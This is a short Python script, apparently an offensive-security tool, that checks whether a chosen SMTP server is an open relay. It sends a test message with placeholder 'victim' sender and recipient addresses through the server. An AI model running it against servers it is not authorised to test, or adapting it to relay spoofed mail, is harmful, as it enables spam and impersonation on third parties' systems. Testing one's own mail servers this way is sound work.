#!/usr/bin/env python3
# Conduct Open Relay Attack
# Author Yehia Elghaly

import smtplib
import email.utils
from email.mime.text import MIMEText

ip = input("Enter Target IP: ")
port = input("Enter Target Port: ")
mf = ("victim@domain.com")
rt = ("victim1@domain.com")
relay = MIMEText('Test Open Relay ')
relay['To'] = email.utils.formataddr(('RCPT TO:', rt))
relay['From'] = email.utils.formataddr(('Mail From:', mf))

server = smtplib.SMTP(ip, port)
server.set_debuglevel(True) # show communication with the server
try:
    server.sendmail(mf, [rt], relay.as_string())
    print ("Vulnerable to Open Relay")
except:
	print ("Not Vulnerable to Open Relay")
	server.quit()